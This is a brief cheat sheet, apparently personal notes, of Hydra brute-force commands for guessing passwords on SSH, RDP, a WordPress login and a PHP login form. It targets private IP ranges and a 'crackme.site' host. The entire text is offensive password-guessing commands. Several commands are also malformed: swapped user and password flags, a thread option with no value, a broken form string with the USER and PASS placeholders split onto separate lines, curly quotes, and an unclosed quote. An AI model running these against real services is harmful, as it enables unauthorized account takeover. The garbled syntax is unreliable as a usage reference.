# Hydra

- hydra -l user -P pass.txt -t 10 172.21.0.0 ssh -s 22
- hydra -l users.txt -p /usr/share/wordlists/rockyou.txt -t 172.21.0.0 ssh -s 22
- hydra -l admin -P ./passwordlist.txt $ip -V http-form-post ‘/wp-login.php:log=&pwd=&wp-submit=Log In&testcookie=1:S=Location’
    
    USER
    
    PASS
    
- hydra -U rdp
- hydra crackme.site http-post-form(service used) "/login.php:usr=USER&pwd=PASS:invalid credidentials (form) -L usr.txt -P password_file